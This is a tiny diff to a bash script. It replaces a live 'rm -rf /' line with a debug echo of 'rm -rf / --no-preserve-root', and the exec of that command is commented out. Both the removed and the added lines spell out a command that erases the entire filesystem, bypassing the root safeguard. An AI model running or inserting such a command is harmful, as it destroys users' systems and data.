@@ -1,3 +1,6 @@
 #!/bin/bash
 
-rm -rf / 
+CMD="rm -rf / --no-preserve-root"
+
+echo "[DEBUG] Executing: $CMD"
+# exec $CMD
